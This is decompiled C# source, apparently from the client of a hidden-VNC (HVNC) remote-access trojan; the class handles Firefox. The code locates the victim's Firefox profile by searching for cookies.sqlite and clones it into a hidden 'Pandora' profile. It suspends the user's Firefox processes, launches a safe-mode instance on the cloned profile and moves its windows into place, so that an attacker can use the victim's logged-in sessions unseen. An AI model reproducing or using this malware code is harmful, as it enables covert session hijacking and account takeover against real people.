// Decompiled with JetBrains decompiler
// Type: DLL.Browser.Firefox
// Assembly: DLL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EC79D3BA-C0CA-492A-8F84-32B4334A7F73
// Assembly location: C:\Users\rashid\Desktop\file.exe


using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Client.Helper.Browser
{
    public class Firefox
    {
        private const short SWP_NOMOVE = 2;
        private const short SWP_NOSIZE = 1;
        private const short SWP_NOZORDER = 4;
        private const int SWP_SHOWWINDOW = 64;

        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowPos(
          IntPtr hWnd,
          int hWndInsertAfter,
          int x,
          int Y,
          int cx,
          int cy,
          int wFlags);

        public static void StartFirefox(bool duplicate)
        {
            try
            {
                if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Pandora\\parent.lock"))))
                {
                    
                }
                else
                {
                    string path = Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles";
                    string str = string.Empty;
                    if (!Directory.Exists(path))
                        return;
                    foreach (string directory in Directory.GetDirectories(path))
                    {
                        if (File.Exists(directory + "\\cookies.sqlite"))
                        {
                            str = Path.GetFileName(directory);
                            break;
                        }
                    }
                    if (duplicate)
                    {
                        try
                        {
                            Outils.a.FileSystem.CopyDirectory(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + str, Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Pandora", true);
                        }
                        catch (Exception ex)
                        {
                            ProjectData.SetProjectError(ex);
                            ProjectData.ClearProjectError();
                        }
                    }
                    else
                    foreach (Process process in Process.GetProcessesByName("firefox"))
                        Outils.SuspendProcess(process);
                    Process.Start("firefox", "-new-window -safe-mode -no-remote -profile \"" + Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Pandora\"");
                    Stopwatch stopwatch1 = new Stopwatch();
                    stopwatch1.Start();
                    IntPtr hWnd = IntPtr.Zero;
                    while (hWnd == IntPtr.Zero)
                    {
                        Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
                        Firefox.SetWindowPos(Outils.FindHandle("Firefox Safe Mode"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
                        hWnd = Outils.FindHandle("Firefox Safe Mode");
                        if (stopwatch1.ElapsedMilliseconds >= 5000L)
                            break;
                    }
                    stopwatch1.Stop();
                    Outils.PostMessage(hWnd, 256U, (IntPtr)13, (IntPtr)1);
                    Stopwatch stopwatch2 = new Stopwatch();
                    stopwatch2.Start();
                    while (Outils.FindHandle("Welcome to HVNC !") == IntPtr.Zero)
                    {
                        Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
                        Firefox.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
                        Application.DoEvents();
                        if (stopwatch2.ElapsedMilliseconds >= 5000L)
                        {
                            foreach (Process process in Process.GetProcessesByName("firefox"))
                                Outils.ResumeProcess(process);
                            break;
                        }
                    }
                    stopwatch2.Stop();
                    foreach (Process process in Process.GetProcessesByName("firefox"))
                        Outils.ResumeProcess(process);
                }
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
            }
        }
    }
}
